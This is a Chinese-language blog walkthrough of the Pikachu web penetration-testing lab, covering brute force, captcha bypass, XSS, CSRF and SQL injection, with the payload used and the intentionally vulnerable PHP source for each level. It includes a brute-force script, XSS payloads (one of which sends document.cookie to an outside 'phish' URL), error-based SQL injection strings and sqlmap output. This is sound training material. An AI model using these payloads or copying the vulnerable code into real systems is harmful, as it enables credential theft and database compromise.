---
title: Pikachu 靶场攻关记录
toc: true
date: 2023-11-11 22:32:36
updated: 2023-11-11 22:32:36
categories: Tech Blog
---

Pikachu是一个面向Web渗透测试学习人员的靶场，其上的漏洞类型列表如下：

- Burt Force(暴力破解漏洞)
- XSS(跨站脚本漏洞)
- CSRF(跨站请求伪造)
- SQL-Inject(SQL注入漏洞)
- RCE(远程命令/代码执行)
- Files Inclusion(文件包含漏洞)
- Unsafe file downloads(不安全的文件下载)
- Unsafe file uploads(不安全的文件上传)
- Over Permisson(越权漏洞)
- ../../../(目录遍历)
- I can see your ABC(敏感信息泄露)
- PHP反序列化漏洞
- XXE(XML External Entity attack)
- 不安全的URL重定向
- SSRF(Server-Side Request Forgery)
- More...(找找看?..有彩蛋!)
- 管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~

每类漏洞根据不同的情况又分别设计了不同的子类

在对靶场进行渗透测试的过程中，我将靶场上的常见 Web 漏洞的概述中有代表性的部分进行了总结，并记录了自己 Hack 过程中使用的技术手段( payload )与思考(牢骚)。

<!--more-->

## Burt Force (暴力破解漏洞)

### 概述

>从来没有哪个时代的黑客像今天一样热衷于猜解密码 ---奥斯特洛夫斯基

“暴力破解”是一种常见攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。
>理论上来说，大多数系统都可以被穷举法这种简单粗暴的手段攻破，这也是暴力破解这一名字的来由，因为真的很暴力，但也真的很有效。判断一个系统是否具有暴力破解漏洞，并不是根据它能否被暴力破解决定，而是由需要多久才能暴力破解决定。如果暴力破解一个系统的过程中待破解的信息已经过了时效性又或者破解这个系统所需要的成本比这个系统所具有的价值高，那么暴力破解就将会是失败的。因此，提高暴力破解的效率是至关紧要的，大部分暴力破解都有着根据某些技术或者线索进一步优化的空间，大有门道可言，从这一角度来说，暴力破解也可以变得十分优雅

攻击者在暴力破解时，所关心的web应用系统所采取的认证安全策略,往往包括但不限于：

1. 是否要求用户设置复杂的密码
2. 是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp
3. 是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）
4. 是否采用了双因素认证

如果一个Web应用系统采用了比较弱的认证安全策略(被暴力破解成功的可能性较高)，那暴力破解漏洞带来的危害一定会远超预期

### 基于表单的暴力破解

#### 漏洞利用

访问该页面可以发现其为表单登陆，没有验证码或其它访问控制措施，直接抓包并上字典爆破即可

爆破报文 (基于 Yakit )

```plaintext
POST /pikachu/vul/burteforce/bf_form.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/pikachu/vul/burteforce/bf_form.php
Cookie: _ga_RTMV0WQ0E9=GS1.1.1706795665.1.1.1706795700.0.0.0; _ga=GA1.1.1296425997.1706795666; security=impossible; PHPSESSID=du3liq1mv90deoasfj0od4b0mo
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
DNT: 1
Sec-GPC: 1
Pragma: no-cache
Cache-Control: no-cache

username=admin&password={{payload(2020-200_most_used_passwords)}}&submit=Login
```

发现 login success

#### 漏洞代码解读

```PHP
// 纯粹的用户登录业务逻辑，没有任何访问控制措施

if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);


    $line_pre->bind_param('ss',$username,$password);

    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= '<p> login success</p>';

        } else{
            $html.= '<p> username or password is not exists～</p>';
        }

    } else{
        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
    }

}
```

### 验证码绕过

#### On Server

##### 漏洞利用

每次访问目标页面，Web Server 都会通过 `http://127.0.0.1/pikachu/inc/showvcode.php` 接口更新用户需要输入的验证码。但由于验证码的更新需要通过触发这个接口才会进行，因此直接通过登陆接口 `http://127.0.0.1/pikachu/vul/burteforce/bf_server.php` 进行登陆则验证码不会更新，故可复用验证码进行爆破

爆破脚本如下

```Python
from http import HTTPStatus
import httpx

def guess_passwd() -> str:
    "get your passwd dictionary"
    return str()

def guess_username() -> str:
    "get your username dictionary"
    return str()

URL = "http://localhost/pikachu/vul/burteforce/bf_server.php"

php_cookie = "du3liq1mv90deoasfj0od4b0mo" #example
cookie: dict[str, str] = {
        "PHPSESSID": php_cookie,
}
user_name: str = guess_username()
passwd: str = guess_passwd()
data = {
    "username":user_name,
     "password":passwd,
    "vcode":"xnc8bk",
    "submit":"Login"
}

resp = httpx.post(URL,data=data,cookies=cookie)
if resp.status_code == HTTPStatus.OK and "login success" in resp.text:
    print("Success")
```

##### 漏洞代码解读

```PHP
if(isset($_POST['submit'])) {
    if (empty($_POST['username'])) {
        $html .= "<p class='notice'>用户名不能为空</p>";
    } else {
        if (empty($_POST['password'])) {
            $html .= "<p class='notice'>密码不能为空</p>";
        } else {
            if (empty($_POST['vcode'])) {
                $html .= "<p class='notice'>验证码不能为空哦！</p>";
            } else {
//              验证验证码是否正确
                if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
                    $html .= "<p class='notice'>验证码输入错误哦！</p>";
                    //应该在验证完成后,销毁该$_SESSION['vcode']
                }else{

                    $username = $_POST['username'];
                    $password = $_POST['password'];
                    $vcode = $_POST['vcode'];

                    $sql = "select * from users where username=? and password=md5(?)";
                    $line_pre = $link->prepare($sql);

                    $line_pre->bind_param('ss',$username,$password);

                    if($line_pre->execute()){
                        $line_pre->store_result();
                        //虽然前面做了为空判断,但最后,却没有验证验证码!!!
                        if($line_pre->num_rows()==1){
                            $html.='<p> login success</p>';
                        }else{
                            $html.= '<p> username or password is not exists～</p>';
                        }
                    }else{
                        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
                    }
                }
            }
        }
    }
}
```

#### On Client

##### 漏洞利用

验证码是由前端生成并检验的，禁用 JS 即可

##### 漏洞代码解读

Server

```PHP
if(isset($_POST['submit'])){
    if($_POST['username'] && $_POST['password']) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $sql = "select * from users where username=? and password=md5(?)";
        $line_pre = $link->prepare($sql);


        $line_pre->bind_param('ss', $username, $password);

        if ($line_pre->execute()) {
            $line_pre->store_result();
            if ($line_pre->num_rows > 0) {
                $html .= '<p> login success</p>';

            } else {
                $html .= '<p> username or password is not exists～</p>';
            }

        } else {
            $html .= '<p>执行错误:' . $line_pre->errno . '错误信息:' . $line_pre->error . '</p>';
        }


    }else{
        $html .= '<p> please input username and password～</p>';
    }


}
```

Client

```JavaScript
var code; //在全局 定义验证码
function createCode() {
    code = "";
    var codeLength = 5;//验证码的长度
    var checkCode = document.getElementById("checkCode");
    var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//所有候选组成验证码的字符，当然也可以用中文的

    for (var i = 0; i < codeLength; i++) {
        var charIndex = Math.floor(Math.random() * 36);
        code += selectChar[charIndex];
    }
    //alert(code);
    if (checkCode) {
        checkCode.className = "code";
        checkCode.value = code;
    }
}

function validate() {
    var inputCode = document.querySelector('#bf_client .vcode').value;
    if (inputCode.length <= 0) {
        alert("请输入验证码！");
        return false;
    } else if (inputCode != code) {
        alert("验证码输入错误！");
        createCode();//刷新验证码
        return false;
    }
    else {
        return true;
    }
}

createCode();
```

### token防爆破

#### 漏洞利用

查看源代码会发现每次进行登陆，服务器都会检验 Token 是否正确，并刷新 Token 。若无 Token 刷新操作则完全可以像之前复用验证码那样复用 Token ，但由于 Token 每次都会刷新，单纯的通过复用进行绕过无法达到暴力破解的目的。但由于该登陆业务只使用了 Token 进行访问控制，因此攻击者仍可以采用一定的技术手段进行暴力破解，例如

- 使用 Python 脚本捕获每一次响应返回的 Token 值将 Token 值填入到下一次请求的请求头中进行爆破
- 使用 Burp Suite 的 Pitchfork 模式通过 Recursive grep 进行爆破
- 使用 Yakit 的草叉模式和数据提取器进行爆破

#### 漏洞代码解读

```PHP
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password'] && $_POST['token']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $token = $_POST['token'];

    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);


    $line_pre->bind_param('ss',$username,$password);

    if($token == $_SESSION['token']){

        if($line_pre->execute()){
            $line_pre->store_result();
            if($line_pre->num_rows>0){
                $html.= '<p> login success</p>';

            } else{
                $html.= '<p> username or password is not exists～</p>';
            }

        }else{
            $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
        }


    }else{
        $html.= '<p> csrf token error</p>';
    }




}


//生成token
set_token();
```

## XSS (跨站脚本漏洞)

### 概述

Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表( Cascading Style Sheets )的缩写"CSS"冲突，故又称 XSS 。一般 XSS 可以分为如下几种常见类型：

1. 反射性 XSS
2. 存储型 XSS
3. DOM 型 XSS

XSS 漏洞在 OWASP TOP10 的排名中常年位居前三，很容易造成较大的危害。它是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。

形成XSS漏洞的主要原因是程序对输入和输出没有做充分的处理，导致被攻击者精心构造的恶意字符串输出在前端时被浏览器当作有效代码解析执行从而产生危害。

在XSS漏洞的防范上，一般会采用

- 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
- 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

的方式进行处理

### 反射型 XSS(get)

#### 漏洞利用

直接输入 html 代码，发现输入的 html 代码会被直接解析并回显到前端，故该输入处为输出点。尝试添加 JavaScript 代码，发现存在输入字符的长度限制。但该限制也是由前端实现的，直接审查元素修改或忽视即可

#### 漏洞代码解读

```PHP
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        if($_GET['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}
```

### 反射型 XSS(post)

#### 漏洞利用

与 get 型一样

#### 漏洞代码解读

```PHP
if(isset($_POST['submit'])){
    if(empty($_POST['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{

        //下面直接将前端输入的参数原封不动的输出了,出现xss
        if($_POST['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_POST['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_POST['message']},i don't care!</p>";
        }
    }
}
```

### 存储型 XSS

#### 漏洞利用

与反射型 XSS 相同，只是被插入的恶意代码会被存储到后端数据库中，并持续性地造成攻击

#### 漏洞代码解读

```PHP
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="<p>数据库出现异常，提交失败！</p>";
    }
}


if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){

    //彩蛋:虽然这是个存储型xss的页面,但这里有个delete的sql注入
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        echo "<script type='text/javascript'>document.location.href='xss_stored.php'</script>";
    }else{
        $html.="<p id='op_notice'>删除失败,请重试并检查数据库是否还好!</p>";

    }

}
```

### DOM 型 XSS

#### 漏洞利用

输入 `xsstest` 进行 Fuzz 测试，通过审查元素搜索 `xsstest` 发现该 payload 被插入成了 a 标签的 href 属性值，尝试构造 payload 闭合该标签

```plaintext
'></a><img src="https://kblauh.dnslog.cn"><a href="
```

对应注入点变为

```HTML
<div id="dom"><a href=""></a><img src="https://kblauh.dnslog.cn"></div>
```

查看 DNSLOG 发现攻击成功

#### 漏洞代码解读

```HTML
<div id="xssd_main">
    <script>
        function domxss(){
            var str = document.getElementById("text").value;
            document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
        }
        //试试：'><img src="#" onmouseover="alert('xss')">
        //试试：' onclick="alert('xss')">,闭合掉就行
    </script>
    <!--<a href="" onclick=('xss')>-->
    <input id="text" name="text" type="text"  value="" />
    <input id="button" type="button" value="click me!" onclick="domxss()" />
       <div id="dom"></div>
</div>
```

### DOM 型 XSS-X

#### 漏洞利用

与前一 DOM 型 XSS 相同，只是获取参数的方式变成了从 URL 的 GET 参数中获取

#### 漏洞代码解读

```HTML
<div id="xssd_main">
    <script>
        function domxss(){
            var str = window.location.search;
            var txss = decodeURIComponent(str.split("text=")[1]);
            var xss = txss.replace(/\+/g,' ');
            //                        alert(xss);

            document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
        }
        //试试：'><img src="#" onmouseover="alert('xss')">
        //试试：' onclick="alert('xss')">,闭合掉就行
    </script>
    <!--<a href="" onclick=('xss')>-->
    <form method="get">
        <input id="text" name="text" type="text"  value="" />
        <input id="submit" type="submit" value="请说出你的伤心往事"/>
    </form>
    <div id="dom"></div>
</div>
```

### XSS 盲打

#### 漏洞利用

XSS 盲打即在不知道后台是否存在 XSS 漏洞的情况下提交 XSS payload ，该 payload 会在后台管理页面被打开时被执行，从而攻击后台管理员以实现攻击目的。直接在该页面的留言板内提交 payload 即可

```HTML
// Use your server
<script>
    document.location = "http://7erry.com/phish?cookie="+document.cookie;
</script>
```

#### 漏洞代码解读

前端

```PHP
if(array_key_exists("content",$_POST) && $_POST['content']!=null){
    $content=escape($link, $_POST['content']);
    $name=escape($link, $_POST['name']);
    $time=$time=date('Y-m-d g:i:s');
    $query="insert into xssblind(time,content,name) values('$time','$content','$name')";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        $html.="<p>谢谢参与，阁下的看法我们已经收到!</p>";
    }else {
        $html.="<p>ooo.提交出现异常，请重新提交</p>";
    }
}
```

后台管理页面

```PHP HTML
<?php
    $query="select * from xssblind";
    $result=mysqli_query($link, $query);
    while($data=mysqli_fetch_assoc($result)){
        $html=<<<A
            <tr>
                <td>{$data['id']}</td>
                <td>{$data['time']}</td>
                <td>{$data['content']}</td>
                <td>{$data['name']}</td>
                <td><a href="admin.php?id={$data['id']}">删除</a></td>
            </tr>
        A;
        echo $html;
    }
?>
```

### XSS 过滤 Bypass

#### 漏洞利用

Fuzz 测试可以得出 `<script` 字符串被过滤了，但可以大小写混写或干脆使用其它标签进行 Bypass ，如 `<ScRiPt></sCrIpT>`

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
//    $message=str_ireplace('<script>',$_GET['message']);

    if($message == 'yes'){
        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
    }

}
```

### XSS htmlspecialchars 转义 Bypass

#### 漏洞利用

从关卡名就能看出使用了 htmlspecialchars 函数对用户输入进行了转义，但该函数不会对 `'` 进行转义，Fuzz 测试后发现传入的 message 既会被放在 `a` 标签的 text 部分，也会被添加为 href 属性值。则可以使引号闭合，借助 onclick 等属性触发 XSS 攻击

payload

```plaintext
'onclick='alert(1)`
```

#### 漏洞代码解读

```PHP
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入点啥吧！</p>";
    }else {
        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
        $message=htmlspecialchars($_GET['message']);
        $html1.="<p class='notice'>你的输入已经被记录:</p>";
        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
//        $html2.="<input class='input' type='text' name='inputvalue' readonly='readonly' value='{$message}' style='margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;'/>";
        $html2.="<a href='{$message}'>{$message}</a>";
    }
}
```

### XSS href 输出

#### 漏洞利用

Fuzz 测试后发现输入内容会被转义并作为 a 标签的 href 属性值，但哪怕无法闭合标签，也可以通过 Javascript 伪协议触发 XSS

```plaintext
Javascript:alert(1)
```

#### 漏洞代码解读

```PHP
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>叫你输入个url,你咋不听?</p>";
    }
    if($_GET['message'] == 'www.baidu.com'){
        $html.="<p class='notice'>我靠,我真想不到你是这样的一个人</p>";
    }else {
        //输出在a标签的href属性里面,可以使用javascript协议来执行js
        //防御:只允许http,https,其次在进行htmlspecialchars处理
        $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
        $html.="<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
    }
}
```

### XSS js 输出

#### 漏洞利用

Fuzz 测试并调试后发现用户输入被动态地生成到了 JavaScript 中，以 payload `xsstest` 为例，被插入到的 JavaScript 语句为

```JavaScript
$ms = 'xsstest'
```

则可使该语句闭合并进行 XSS 攻击

```plaintext
123'</script><img src="https://w8hwd8.dnslog.cn">
```

DNSLOG 成功回显

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['message'] !=null){
    $jsvar=$_GET['message'];
//    $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);
    if($jsvar == 'tmac'){
        $html.="<img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/tmac.jpeg' />";
    }
}
```

```HTML
<script>
    $ms='<?php echo $jsvar;?>';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }
</script>
```

## CSRF (跨站请求伪造)

### 概述

CSRF ( Cross-site request forgery ) 又名跨站请求伪造，它即发生在客户端的 SSRF

### CSRF (get)

#### 漏洞利用

使用提示中给出的账号进行登陆，然后修改一次账号信息并抓包，发现修改信息业务通过发起 GET 请求执行。修改 GET 请求 URL 并进行测试，攻击成功

``` plaintext
?sex=male&phonenum=123&add=123&email=123@12.com&submit=submit
```

### CSRF (post)

#### 漏洞利用

与 GET 型 CSRF 攻击利用方式基本一致，只是触发其的方式需要由欺骗受害者点击 URL 修改为需要诱骗受害者使用表单或其它发起 POST 请求的方式

### CSRF Token

#### 漏洞利用

该关卡实际上仍是 GET 型 CSRF 攻击，但在 GET 请求参数中设置了 token 字段。这种在请求中加入攻击者无法伪造的信息是抵御 CSRF 攻击的有效方式，每次请求都需要提供能够被后台验证通过的 token 。这种情况下的 CSRF 漏洞利用往往需要配合 XSS 获取用户身份信息。一个经典例子是[使用CSRF盗取SELF-XSS的Cookie](#reference),在此就不过多赘述

## SQL Inject (SQL注入漏洞)

### 概述

代码注入漏洞常年霸榜 OWASP TOP 10 。其中数据库注入更是其代表漏洞。SQL 注入又是数据库注入的典型，是 Web 安全最经典的漏洞利用技术。它  主要形成的原因是，在数据交互中，前端的数据传入到后端处理时，后端没有做严格的筛选与过滤，导致传入的被攻击者锁精心构造的恶意数据拼接到 SQL 语句中并被当作 SQL 语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。哪怕目前有很多 ORM 框架都提供了使用参数化技术防止 SQL 注入的方案，但其也存在使用语句拼接的地方,SQL 注入仍有较大的发挥空间

### 数字型注入

#### 漏洞利用

fuzzing payload `1 or 1=1` 通过，存在数字型 SQL 注入点，然后一条龙即可

#### 漏洞代码解读

```PHP
if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}
```

### 字符型注入

#### 漏洞利用

fuzzing payload `1' or '1' = '1`通过，存在字符型 SQL 注入点，然后一条龙即可

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

### 搜索型注入

#### 漏洞利用

随意进行搜索发现该页面实现了模糊查询，猜测使用的 SQL 语句为 `SELECT * FROM TABLE_NAME WHERE COLUMN_NAME LIKE "&USER_INPUT&"` 。fuzzing payload `' or 1=1--+` 通过，存在搜索型 SQL 注入点，然后一条龙即可

> 审计源代码后发现该页面还存在 XSS 漏洞，原因是传入的 username 会直接回显到页面中

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['name']!=null){

    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];

    //这里的变量是模糊匹配，需要考虑闭合
    $query="select username,id,email from member where username like '%$name%'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        //彩蛋:这里还有个xss
        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
        while($data=mysqli_fetch_assoc($result)){
            $uname=$data['username'];
            $id=$data['id'];
            $email=$data['email'];
            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
        }
    }else{

        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";
    }
}
```

### XX 型注入

#### 漏洞利用

fuzzing payload `') or 1=1 --+` 通过，该注入点通过单引号和括号闭合，接下来可一条龙

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username=('$name')";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

### insert/update 语句注入

#### 漏洞利用

insert/update 语句执行后无法直接获取到数据，也无法使用联表查询。此时往往使用报错注入以外带数据。登陆业务往往是通过 SELECT 语句进行判断的，但 fuzz 测试后发现较难注入，不过有报错信息。注意到该页面存在注册入口，由于注册等业务需要写入数据，因此往往与 insert 等 SQL 语句相关联，可尝试寻找注册页面的注入点。

在注册页面的必填字段测试 `')` 观察报错信息发现 password 字段值被 md5 函数以`md5('PASSWORD_INPUT')` 包裹，username 字段值被 ' 包裹。

fuzzing payload 可爆出数据库名，登陆成功后的信息修改页面与当前注册页面的其余一条龙注入 payload 类似

```plaintext
//username: 1' and extractvalue(1,concat(0x5c,database(),0x5c)),1,1,1,1,1)#
// password: 123

// 也可以用 updatexml 函数
// username: 1' and updatexml(0,concat(0x5c,database(),0x5c),1),1,1,1,1,1)#
username=1%27+and+extractvalue%281%2Cconcat%280x5c%2Cdatabase%28%29%2C0x5c%29%29%2C1%2C1%2C1%2C1%2C1%29%23&password=123&sex=&phonenum=&email=&add=&submit=submit
```

#### 漏洞代码解读

注册页面 ( insert )

```PHP
if(isset($_POST['submit'])){
    if($_POST['username']!=null &&$_POST['password']!=null){
//      $getdata=escape($link, $_POST);//转义

        //没转义,导致注入漏洞,操作类型为insert
        $getdata=$_POST;
        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1){
            $html.="<p>注册成功,请返回<a href='sqli_login.php'>登录</a></p>";
        }else {
            $html.="<p>注册失败,请检查下数据库是否还活着</p>";

        }
    }else{
        $html.="<p>必填项不能为空哦</p>";
    }
}
```

修改信息页面 ( update )

```PHP
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
//        $getdata=escape($link, $_POST);

        //未转义,形成注入,sql操作类型为update
        $getdata=$_POST;
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:sqli_mem.php");
        }else {
            $html1.='修改失败，请重试';

        }
    }
}
```

### delete 语句注入

#### 漏洞利用

删除留言的接口为 `http://localhost/pikachu/vul/sqli/sqli_del.php?id=`，payload 与 insert/update 语句类似

#### 漏洞代码解读

```PHP
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    //插入转义
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="<p>出现异常，提交失败！</p>";
    }
}


// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
//没对传进来的id进行处理，导致DEL注入
if(array_key_exists('id', $_GET)){
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        header("location:sqli_del.php");
    }else{
        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";
    }
}
```

### HTTP Headers 注入

#### 漏洞利用

通过 Header 传参的普通 SQL 注入，正常注即可

#### 漏洞代码解读

```PHP
//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];

//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
$result=execute($link, $query);
```

### 布尔盲注

#### 漏洞利用

SQLMap 一把梭即可

```bash
sqlmap.exe -u "http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=1&submit=submit" --current-db --batch
```

注入结果

```plaintext
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: name (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=1' AND (SELECT 1790 FROM (SELECT(SLEEP(5)))qkmu) AND 'btIw'='btIw&submit=submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: name=1' UNION ALL SELECT NULL,CONCAT(0x7176787071,0x564851436865555a47677356774658544f4f4f6479486a4c506d65746b5975556341797041724361,0x7178717871)-- -&submit=submit
---
[21:14:04] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.39, PHP, PHP 8.0.2
back-end DBMS: MySQL >= 5.0.12
[21:14:04] [INFO] fetching current database
current database: 'pikachu'
```

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result=mysqli_query($link, $query);//
//     $result=execute($link, $query);
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}

```

### 时间盲注

#### 漏洞利用

SQLMap 一把梭

#### 漏洞代码解读

```PHP
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//     $result=execute($link, $query);
//    $html.="<p class='notice'>i don't care who you are!</p>";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="<p class='notice'>i don't care who you are!</p>";
        }
    }else{

        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}
```

### 宽字节注入

#### 漏洞利用

